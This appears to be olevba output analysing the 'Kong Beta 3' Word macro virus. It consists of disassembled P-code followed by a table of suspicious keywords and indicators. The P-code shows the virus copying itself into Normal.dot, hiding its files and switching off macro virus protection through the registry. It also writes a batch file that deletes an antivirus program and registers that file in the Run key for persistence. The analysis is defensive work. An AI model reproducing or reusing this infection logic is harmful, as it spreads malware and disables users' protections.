' Line #360:
' 	Dim 
' 	VarDefn AD (As Object)
' Line #361:
' 	OnError Gagal 
' Line #362:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #363:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #364:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #365:
' 	SetStmt 
' 	Ld AD 
' 	Set File 
' Line #366:
' 	Ld File 
' 	ArgsCall Periksa 0x0001 
' Line #367:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #368:
' 	ArgsCall TularFile 0x0000 
' Line #369:
' 	EndIfBlock 
' Line #370:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #371:
' 	Label Gagal 
' Line #372:
' 	EndSub 
' Line #373:
' 	FuncDefn (Sub AutoClose())
' Line #374:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #375:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #376:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #377:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #378:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #379:
' Line #380:
' 	OnError (Resume Next) 
' Line #381:
' 	ArgsCall TularGlobal 0x0000 
' Line #382:
' 	ArgsCall TularFile 0x0000 
' Line #383:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	St Tanggal 
' Line #384:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	St Bulan 
' Line #385:
' 	Ld Tanggal 
' 	LitDI2 0x001D 
' 	Eq 
' 	Ld Bulan 
' 	LitDI2 0x0002 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld Tanggal 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Bulan 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Tanggal 
' 	LitDI2 0x0010 
' 	Eq 
' 	Ld Bulan 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #386:
' 	ArgsCall Tampil 0x0000 
' Line #387:
' 	EndIfBlock 
' Line #388:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #389:
' 	EndSub 
' Line #390:
' 	FuncDefn (Function Register())
' Line #391:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #392:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #393:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #394:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #395:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #396:
' Line #397:
' 	OnError (Resume Next) 
' Line #398:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "DefName"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St DefName 
' Line #399:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "DefCompany"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St DefCompany 
' Line #400:
' 	Ld DefName 
' 	LitStr 0x000C "King of Kong"
' 	Ne 
' 	Ld DefCompany 
' 	LitStr 0x0018 "K&K Software Design,Inc."
' 	Ne 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #401:
' 	LitStr 0x000C "King of Kong"
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "DefName"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #402:
' 	LitStr 0x0018 "K&K Software Design,Inc."
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "DefCompany"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #403:
' 	LitStr 0x000C "King of Kong"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #404:
' 	LitStr 0x0018 "K&K Software Design,Inc."
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #405:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #406:
' 	EndIfBlock 
' Line #407:
' 	EndFunc 
' Line #408:
' 	FuncDefn (Function TularGlobal())
' Line #409:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #410:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #411:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #412:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #413:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #414:
' Line #415:
' 	OnError (Resume Next) 
' Line #416:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Tempat$ 
' Line #417:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Tempat2$ 
' Line #418:
' 	Ld Tempat$ 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld FileKing$ 
' 	Concat 
' 	St TargetFile$ 
' Line #419:
' 	Ld Tempat2$ 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld FileKong$ 
' 	Concat 
' 	St Cadangan$ 
' Line #420:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St Carrier$ 
' Line #421:
' 	Ld Carrier$ 
' 	Ld Carrier$ 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "TMP"
' 	Concat 
' 	St Sumber$ 
' Line #422:
' 	Ld Carrier$ 
' 	Ld Carrier$ 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "BAK"
' 	Concat 
' 	St Sumber2$ 
' Line #423:
' 	Ld FileKing$ 
' 	Ld Tempat$ 
' 	ArgsLd Kena 0x0002 
' 	Not 
' 	Ld FileKong$ 
' 	Ld Tempat2$ 
' 	ArgsLd Kena 0x0002 
' 	Not 
' 	Or 
' 	Paren 
' 	IfBlock 
' Line #424:
' 	Ld Sumber$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #425:
' 	Ld Sumber2$ 
' 	Ld TargetFile$ 
' 	ArgsCall FileCopy 0x0002 
' Line #426:
' 	Ld Sumber$ 
' 	Ld Cadangan$ 
' 	ArgsCall FileCopy 0x0002 
' Line #427:
' 	Ld Sumber 
' 	Ld vbReadOnly 
' 	Ld vbHidden 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' Line #428:
' 	Ld TargetFile$ 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #429:
' 	Ld Cadangan$ 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #430:
' 	ArgsCall BacaTulisFile 0x0000 
' Line #431:
' 	EndIfBlock 
' Line #432:
' 	EndFunc 
' Line #433:
' 	FuncDefn (Sub FileTemplates())
' Line #434:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #435:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #436:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #437:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #438:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #439:
' Line #440:
' 	LitDI2 0x0057 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #441:
' 	EndSub 
' Line #442:
' 	FuncDefn (Function TularFile())
' Line #443:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #444:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #445:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #446:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #447:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #448:
' Line #449:
' 	OnError (Resume Next) 
' Line #450:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Tempat$ 
' Line #451:
' 	Ld Tempat$ 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld FileKing$ 
' 	Concat 
' 	St TargetFile$ 
' Line #452:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld FileKong$ 
' 	Concat 
' 	St TargetFile2$ 
' Line #453:
' 	Ld ActiveDocument 
' 	St DokumentAktif$ 
' Line #454:
' 	Ld DokumentAktif$ 
' 	Ld DokumentAktif$ 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "TMP"
' 	Concat 
' 	St CarrierFile$ 
' Line #455:
' 	Ld DokumentAktif$ 
' 	Ld DokumentAktif$ 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "BAK"
' 	Concat 
' 	St CarrierFile2$ 
' Line #456:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St Carrier$ 
' Line #457:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St LokasiFile$ 
' Line #458:
' 	Ld LokasiFile$ 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld CarrierFile$ 
' 	Concat 
' 	St Sumber$ 
' Line #459:
' 	Ld LokasiFile$ 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld CarrierFile2$ 
' 	Concat 
' 	St Sumber2$ 
' Line #460:
' 	Ld CarrierFile$ 
' 	Ld LokasiFile$ 
' 	ArgsLd Kena 0x0002 
' 	Not 
' 	Ld CarrierFile2$ 
' 	Ld LokasiFile$ 
' 	ArgsLd Kena 0x0002 
' 	Not 
' 	Or 
' 	IfBlock 
' Line #461:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #462:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #463:
' 	Ld Selection 
' 	ArgsMemCall Copy 0x0000 
' Line #464:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #465:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #466:
' 	Ld Carrier$ 
' 	ArgsCall Kill 0x0001 
' Line #467:
' 	Ld TargetFile$ 
' 	Ld Carrier$ 
' 	ArgsCall FileCopy 0x0002 
' Line #468:
' 	Ld TargetFile$ 
' 	Ld Sumber2$ 
' 	ArgsCall FileCopy 0x0002 
' Line #469:
' 	Ld TargetFile2$ 
' 	Ld Sumber$ 
' 	ArgsCall FileCopy 0x0002 
' Line #470:
' 	Ld Carrier$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #471:
' 	Ld Sumber$ 
' 	Ld vbReadOnly 
' 	Ld vbHidden 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' Line #472:
' 	Ld Sumber2$ 
' 	Ld vbReadOnly 
' 	Ld vbHidden 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' Line #473:
' 	Ld Carrier$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' Line #474:
' 	Ld Selection 
' 	ArgsMemCall Paste 0x0000 
' Line #475:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #476:
' 	EndIfBlock 
' Line #477:
' 	EndFunc 
' Line #478:
' 	FuncDefn (Sub ToolsOptions())
' Line #479:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #480:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #481:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #482:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #483:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #484:
' Line #485:
' 	OnError (Resume Next) 
' Line #486:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #487:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #488:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #489:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #490:
' 	LitDI2 0x03CE 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #491:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #492:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #493:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #494:
' 	EndWith 
' Line #495:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #496:
' 	EndSub 
' Line #497:
' 	FuncDefn (Sub BacaTulisFile())
' Line #498:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #499:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #500:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #501:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #502:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #503:
' Line #504:
' 	OnError (Resume Next) 
' Line #505:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Tempat$ 
' Line #506:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd FullName 
' 	St Target$ 
' Line #507:
' 	Ld Tempat$ 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld FileKong$ 
' 	Concat 
' 	St TargetFile$ 
' Line #508:
' 	LitDI2 0x0004 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Base$ 
' Line #509:
' 	Ld Base$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #510:
' 	LitStr 0x000A "C:\WINDOWS"
' 	LitDI2 0x0004 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #511:
' 	LitDI2 0x0004 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Base$ 
' Line #512:
' 	EndIfBlock 
' Line #513:
' 	LitStr 0x000A "MsKong.Bat"
' 	St Parasit$ 
' Line #514:
' 	Ld Base$ 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld Parasit$ 
' 	Concat 
' 	St ParasitBase$ 
' Line #515:
' 	Ld Parasit$ 
' 	Ld Base$ 
' 	ArgsLd Kena 0x0002 
' 	Not 
' 	IfBlock 
' Line #516:
' 	Ld ParasitBase$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #517:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@Echo Off"
' 	PrintItemNL 
' Line #518:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Rem This Line For Master Kong"
' 	PrintItemNL 
' Line #519:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "If Exist "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0024 "C:\Program Files\BanMacro\BanMacro.*"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 " Del "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0024 "C:\Program Files\BanMacro\BanMacro.*"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 " > nul "
' 	Concat 
' 	PrintItemNL 
' Line #520:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "If Exist "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld TargetFile$ 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 " Del "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Target$ 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 " > nul"
' 	Concat 
' 	PrintItemNL 
' Line #521:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "If Exist "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld TargetFile$ 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 " Copy "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld TargetFile 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Target$ 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 " > nul"
' 	Concat 
' 	PrintItemNL 
' Line #522:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "Attrib -r "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Target$ 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 " > nul"
' 	Concat 
' 	PrintItemNL 
' Line #523:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #524:
' 	Ld ParasitBase$ 
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0006 "LoadMe"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #525:
' 	EndIfBlock 
' Line #526:
' 	EndSub 
' Line #527:
' 	FuncDefn (Sub Animasi(JenisHuruf, Warna, AnimasiHuruf, Huruf, HurufBaru, Ukuran, Tanggal))
' Line #528:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #529:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #530:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #531:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #532:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #533:
' Line #534:
' 	OnError (Resume Next) 
' Line #535:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #536:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #537:
' 	Ld Tanggal 
' 	LitDI2 0x0010 
' 	Ne 
' 	IfBlock 
' Line #538:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	MemLd Font 
' 	With 
' Line #539:
' 	Ld HurufBaru 
' 	LitStr 0x0001 "©"
' 	Eq 
' 	IfBlock 
' Line #540:
' 	Ld JenisHuruf 
' 	MemStWith New 
' Line #541:
' 	EndIfBlock 
' Line #542:
' 	Ld Ukuran 
' 	MemStWith Size 
' Line #543:
' 	Ld Warna 
' 	MemStWith ColorIndex 
' Line #544:
' 	Ld AnimasiHuruf 
' 	MemStWith Animation 
' Line #545:
' 	EndWith 
' Line #546:
' 	EndIfBlock 
' Line #547:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #548:
' 	Ld Huruf 
' 	MemStWith Then 
' Line #549:
' 	Ld HurufBaru 
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #550:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #551:
' 	LitDI2 0x0001 
' 	MemStWith Wrap 
' Line #552:
' 	LitVarSpecial (True)
' 	MemStWith Format$ 
' Line #553:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #554:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #555:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #556:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #557:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #558:
' 	EndWith 
' Line #559:
' 	LitDI2 0x0002 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #560:
' 	EndSub 
' Line #561:
' 	FuncDefn (Sub ViewVBCode())
' Line #562:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #563:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #564:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #565:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #566:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #567:
' Line #568:
' 	OnError (Resume Next) 
' Line #569:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #570:
' 	Ld msoAnimationGetTechy 
' 	MemStWith Animation 
' Line #571:
' 	LitStr 0x0019 "What would you like to do"
' 	MemStWith Heading 
' Line #572:
' 	LitStr 0x001A "Sorry, Just For Einstein !"
' 	MemStWith Then 
' Line #573:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #574:
' 	ArgsMemCallWith Show 0x0000 
' Line #575:
' 	EndWith 
' Line #576:
' 	ArgsCall TularFile 0x0000 
' Line #577:
' 	ArgsCall TularGlobal 0x0000 
' Line #578:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	St Tanggal 
' Line #579:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	St Bulan 
' Line #580:
' 	Ld Tanggal 
' 	LitDI2 0x001D 
' 	Eq 
' 	Ld Bulan 
' 	LitDI2 0x0002 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld Tanggal 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Bulan 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	Ld Tanggal 
' 	LitDI2 0x0010 
' 	Eq 
' 	Ld Bulan 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #581:
' 	ArgsCall Tampil 0x0000 
' Line #582:
' 	EndIfBlock 
' Line #583:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #584:
' 	EndSub 
' Line #585:
' Line #586:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Register            |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MsKong.dll          |Executable file name                         |
|IOC       |MsKong.Bat          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

